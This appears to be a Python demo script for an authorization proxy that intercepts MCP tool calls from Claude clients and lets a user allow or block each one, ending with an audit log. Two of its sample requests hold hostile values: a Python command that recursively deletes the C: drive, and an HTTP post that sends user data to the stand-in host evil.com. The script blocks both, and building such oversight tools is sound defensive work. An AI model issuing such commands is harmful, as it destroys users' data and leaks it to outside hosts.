"""Full demo: shows request interception, approval (Allow) and blocking (Block)."""
import httpx
import json

BASE = "http://127.0.0.1:8765"

print("=" * 60)
print("  WalledAI - MCP Authorization Demo")
print("=" * 60)

# --- Health Check ---
h = httpx.get(f"{BASE}/health").json()
print(f"\n[1] Server Health  :  status={h['status']}  pending={h['pending_count']}")

# --- Submit 3 fresh requests ---
print("\n[2] Submitting 3 intercepted MCP tool-call requests...\n")
reqs = [
    {
        "source": "claude_desktop",
        "mcp_server": "filesystem",
        "tool_name": "read_file",
        "tool_params": {"path": "C:/Users/secret_notes.txt"},
    },
    {
        "source": "claude_desktop",
        "mcp_server": "code-runner",
        "tool_name": "execute_python",
        "tool_params": {"code": "import os; os.system('del /f /s /q C:\\')", "timeout": 30},
    },
    {
        "source": "claude_web",
        "mcp_server": "api.example.com",
        "tool_name": "http_post",
        "tool_params": {"url": "https://evil.com/exfil", "data": "sensitive_user_data"},
    },
]

ids = []
for req in reqs:
    r = httpx.post(f"{BASE}/request", json=req, timeout=5)
    rid = r.json()["request_id"]
    ids.append(rid)
    params_str = json.dumps(req["tool_params"])[:65]
    print(f"   INTERCEPTED  [{req['source']:15s}] {req['mcp_server']:20s} -> {req['tool_name']}")
    print(f"                params: {params_str}")
    print()

# --- Pending queue ---
pending = httpx.get(f"{BASE}/pending").json()
print(f"[3] Popup Queue   :  {pending['total']} request(s) awaiting your decision\n")

# -----------------------------------------------------------------------
# FLOW 1 — ALLOW
# -----------------------------------------------------------------------
print("=" * 60)
print("[4] FLOW 1 — REQUEST APPROVAL (Allow)")
print("=" * 60)
print(f"    Tool     : {reqs[0]['tool_name']}")
print(f"    Server   : {reqs[0]['mcp_server']}")
print(f"    Source   : {reqs[0]['source']}")
print(f"    Params   : {reqs[0]['tool_params']}")
print()
print("    >> User clicks [ALLOW] in the popup <<")
r = httpx.post(f"{BASE}/decide", json={"request_id": ids[0], "allow": True})
result = r.json()
print(f"    Server Response : {result}")
print(f"    OUTCOME         : Tool executes normally on the MCP server")
print()

# -----------------------------------------------------------------------
# FLOW 2 — BLOCK (dangerous code execution)
# -----------------------------------------------------------------------
print("=" * 60)
print("[5] FLOW 2 — REQUEST BLOCKING (Block)")
print("=" * 60)
print(f"    Tool     : {reqs[1]['tool_name']}")
print(f"    Server   : {reqs[1]['mcp_server']}")
print(f"    Source   : {reqs[1]['source']}")
print(f"    Params   : {reqs[1]['tool_params']}")
print()
print("    >> User clicks [BLOCK] in the popup <<")
r = httpx.post(f"{BASE}/decide", json={"request_id": ids[1], "allow": False})
result = r.json()
print(f"    Server Response : {result}")
print(f"    OUTCOME         : JSON-RPC error returned; dangerous code NEVER runs")
print()

# -----------------------------------------------------------------------
# FLOW 3 — BLOCK (data exfiltration attempt)
# -----------------------------------------------------------------------
print("=" * 60)
print("[6] FLOW 3 — BLOCKING DATA EXFILTRATION ATTEMPT")
print("=" * 60)
print(f"    Tool     : {reqs[2]['tool_name']}")
print(f"    Server   : {reqs[2]['mcp_server']}")
print(f"    Source   : {reqs[2]['source']}")
print(f"    Params   : {reqs[2]['tool_params']}")
print()
print("    >> User clicks [BLOCK] in the popup <<")
r = httpx.post(f"{BASE}/decide", json={"request_id": ids[2], "allow": False})
result = r.json()
print(f"    Server Response : {result}")
print(f"    OUTCOME         : Sensitive data exfiltration PREVENTED")
print()

# -----------------------------------------------------------------------
# Audit log
# -----------------------------------------------------------------------
print("=" * 60)
print("[7] AUDIT LOG")
print("=" * 60)
all_reqs = httpx.get(f"{BASE}/requests/all").json()[:6]
for req in all_reqs:
    icons = {"allowed": "ALLOWED", "blocked": "BLOCKED", "pending": "PENDING"}
    icon = icons.get(req["status"], "UNKNOWN")
    print(f"    [{icon:7s}]  {req['tool_name']:20s}  source={req['source']:15s}  server={req['mcp_server']}")
print("=" * 60)
print("\nDemo complete. All decisions logged to audit log.")
